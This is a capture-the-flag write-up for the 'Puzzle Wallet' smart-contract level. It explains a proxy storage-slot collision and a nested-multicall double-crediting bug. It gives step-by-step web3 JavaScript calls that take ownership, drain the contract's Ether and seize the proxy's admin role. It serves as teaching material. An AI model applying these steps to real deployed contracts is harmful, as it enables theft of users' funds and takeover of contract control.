## Solution

The goal of this challenge is to become the `admin` of `PuzzleProxy`.

Recall that the storage slot arrangement in both proxy and implementation should be the same.
However, this is not the case here!
Instead, we have:

| Slot | PuzzleProxy | PuzzleWallet |
|------|-------------|--------------|
|  0   | pendingAdmin| owner        |
|  1   | admin       | maxBalance   |

This tells us that, in order to become the `admin`, we need to find a way to write our address to slot 1, i.e., we either update `admin` directly or indirectly by writing a suitable value to `maxBalance`.

Looking at our `PuzzleWallet` implementation, we see that it has two functions that can modify `maxBalance`:

```solidity
function init(uint256 _maxBalance) public {
    require(maxBalance == 0, "Already initialized");
    maxBalance = _maxBalance;
    owner = msg.sender;
}
...
function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
    require(address(this).balance == 0, "Contract balance is not 0");
    maxBalance = _maxBalance;
}
```

We can see that `init()` requires `maxBalance` to be zero when the function is called.
Hence, we won't be able to use it to modify `maxBalance` after the contract has been initialized with a non-zero value.

`setMaxBalance()`, on the other hand, looks more promising as it's only checking if the contract's balance is zero.
However, `setMaxBalance()` has an `onlyWhitelisted()` modifier applied to it, indicating that we first need to call the following function:

```solidity
function addToWhitelist(address addr) external {
    require(msg.sender == owner, "Not the owner");
    whitelisted[addr] = true;
}
```

Again, we see that there is yet another check that prevents us from calling the function.
In this case, we're required to be the `owner` in order to add an address to the whitelist.

Looking at our storage slot table from earlier, we see that we can manipulate the `owner` either by writing directly to `owner` or by setting a new value for `pendingAdmin` as both share storage slot 0.
The latter is easily achieved using the `proposeNewAdmin()` function, specifying our own address as the new `pendingAdmin`.

Let's now take a closer look at the function that will allow us to drain the balance:

```solidity
function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted {
    require(balances[msg.sender] >= value, "Insufficient balance");
    balances[msg.sender] -= value;
    (bool success,) = to.call{value: value}(data);
    require(success, "Execution failed");
}
```

This is the only function making a `call()` to an address `to` with some `value` sent with that call.
However, it requires the balance of the caller to be at least the value sent. 

So, to fulfill this requirement, we need to find a way to successfully pretend that we have more balance than we actually do.
If we can achieve that, we can use `execute()` to drain the entire balance from the contract.

Looking for a function we can use to manipulate our balance, we see that `deposit()` allows us to deposit an amount into the contract and adds this amount to our value in the `balances` mapping.
However, if we just make a normal call to `deposit()`, it will add the amount in both the contract's and the `balances` mapping's bookkeeping.
Recall, though, that we need to find a way to deposit our Ether only once, but increase the value in the `balances` mapping twice in order to successfully call `execute()`. 

This is where `multicall()` comes in. 
`multicall()` allows us to call a function multiple times in a single transaction.

```solidity
function multicall(bytes[] calldata data) external payable onlyWhitelisted {
    bool depositCalled = false;
    for (uint256 i = 0; i < data.length; i++) {
        bytes memory _data = data[i];
        bytes4 selector;
        assembly {
            selector := mload(add(_data, 32))
        }
        if (selector == this.deposit.selector) {
            require(!depositCalled, "Deposit can only be called once");
            // Protect against reusing msg.value
            depositCalled = true;
        }
        (bool success,) = address(this).delegatecall(data[i]);
        require(success, "Error while delegating call");
    }
}
```

The idea would be to call `deposit()` multiple times, supplying Ether only once. 
However, there's yet another validation we need to worry about:
`multicall()` is extracting `deposit()`'s function selector from the data passed to it and will change the `depositCalled` flag accordingly.

To bypass this, we can call `multicall()` so that it calls multiple `multicall()`s with each of these `multicall()`s calling `deposit()` once.
Note that `depoistCalled` won't get in the way here, since each `multicall()` will check their own `depositCalled` value.

Starting out, the contract balance is 0.001 ETH.
If we call `deposit()` two times through two `multicall()`s in the same transaction, then `balances[player]` is changed from 0 ETH to 0.002 ETH although only 0.001 ETH is actually sent.
Therefore, the actual Ether balance of the contract is then 0.002 ETH, but the accounting in `balances` would report that it's 0.003 ETH.
In any case, our player account is now eligible to take out 0.002 ETH from the contract and, hence, drain the wallet.

Therefore, we can call `execute()` to drain the contract, subsequently call `setMaxBalance()` to override slot 1, thereby updating the value of the `admin`.

All right!
Now that we have a clear path forward, let's list to concrete steps that are necessary to solve this level.

**Step 1**

Become the `owner`.

```javascript
functionSignature = {
    name: 'proposeNewAdmin',
    type: 'function',
    inputs: [
        {
            type: 'address',
            name: '_newAdmin'
        }
    ]
}

params = [player]

data = web3.eth.abi.encodeFunctionCall(functionSignature, params)

await web3.eth.sendTransaction({from: player, to: instance, data})
```

**Step 2**

Whitelist your account.

```javascript
await contract.addToWhitelist(player)
```

**Step 3**

Make a call to `multicall()` that will in turn call two `multicall()`s that each will in turn call `deposit()` once.
Furthermore, ensure to send a value of 0.001 ETH with the transaction.

```javascript
// Get function call encodings
// deposit() method
depositData = await contract.methods["deposit()"].request().then(v => v.data)
// multicall() method with param of deposit function call signature
multicallData = await contract.methods["multicall(bytes[])"].request([depositData]).then(v => v.data)

// Perform the actual call
await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})
```

**Step 4**

Drain the 0.002 ETH from the contract.

```javascript
await contract.execute(player, toWei('0.002'), 0x0)
```

**Step 5**

Lastly, set `admin` to `player`.

```javascript
await contract.setMaxBalance(player)
```
